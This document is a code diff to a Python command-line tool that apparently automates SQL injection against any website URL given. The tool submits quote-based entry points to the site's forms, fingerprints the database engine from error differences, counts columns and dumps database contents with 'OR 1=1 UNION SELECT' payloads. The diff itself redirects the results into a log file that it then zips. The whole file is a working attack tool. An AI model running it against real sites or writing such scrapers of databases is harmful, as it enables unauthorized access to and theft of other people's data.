@@ -1,15 +1,16 @@
 from requests_html import HTMLSession
 from urllib.parse import urljoin
-from pprint import pprint
 import argparse
 from urllib.parse import urlencode
 import requests
 from utils import get_all_forms, get_form_details, diff_html
+import zipfile
+import os
 
 parser = argparse.ArgumentParser(description="Perform sqli detection on a website")
 parser.add_argument("url", help="URL of the website to scan")
 parser.add_argument("-X", type=str, default="GET", metavar="METHOD", help="Enter the method")
-# parser.add_argument("o", help="Enter the output of archive file")
+parser.add_argument("-o", type=str, default="logs", metavar="FILE", help="Enter the output of archive file")
 
 args = parser.parse_args()
 entrypoints = [ "'", "\"", "`", "')", "\")", "`)", "'))", "\"))", "`))"]
@@ -26,7 +27,6 @@ comments = {
 	"sqlite": "--",
 	"mysql": "#",
 }
-# data[input_tag["name"]] = "' UNION SELECT sql, name FROM sqlite_master --"
 
 def make_request(injectable_input, form_details, payload, method):
 	data = {}
@@ -67,7 +67,6 @@ def detect_database_engine(form_details, method):
 				res = make_request(input_tag["name"], form_details, payload, method)
 				diff = diff_html(page.text.splitlines(keepends=True), res.text.splitlines(keepends=True))
 				engine = detect_error(diff)
-				# print(res.text.splitlines(keepends=True))
 			if engine != "Unknown" and input_tag["name"] != None:
 				working.append([engine, payload, input_tag["name"]])
 	return working
@@ -93,12 +92,13 @@ def dump_database(input, working, form_details, nb_columns, engine):
 		insert += ",NULL"
 		count += 1
 	payload = f"{working} OR 1=1 UNION SELECT {insert} {tables[engine]} {comments[engine]}"
-	print("PAYLOAD USED: ", payload)
+	log.write(f"PAYLOAD USED: {payload}\n")
 	res = make_request(input, form_details, payload, args.X)
 	diff = diff_html(page.text.splitlines(keepends=True), res.text.splitlines(keepends=True))
 	return diff
 
 if __name__ == "__main__":
+	log = open(args.o, "w")
 	session = HTMLSession()
 	page = session.get(args.url)
 	forms = get_all_forms(args.url)
@@ -112,11 +112,16 @@ if __name__ == "__main__":
 			continue
 		payload_working = detect_database_engine(form_details, args.X)
 		if payload_working == []:
-			print("No SQL injection found")
+			log.write("No SQL injection found")
 			exit(0)
 		for payload in payload_working:
 			columns = detect_number_of_columns(payload[2], form_details, payload[1], payload[0],args.X)
-			print("VULNERABLE PARAMETER: ", payload[2])
-			print("ENGINE: ", payload[0])
-			print("DATABASE INFOS: ", dump_database(payload[2], payload[1], form_details, columns, payload[0]))
-			print("-" * 100)
+			log.write(f"VULNERABLE PARAMETER: {payload[2]}\n")
+			log.write(f"ENGINE: {payload[0]}\n")
+			log.write(f"DATABASE INFOS: {dump_database(payload[2], payload[1], form_details, columns, payload[0])}\n")
+			log.write("-" * 100 + "\n")
+	log.close()
+	with zipfile.ZipFile(args.o + ".zip", "w") as zipf:
+		zipf.write(args.o)
+	os.remove(args.o)
+	
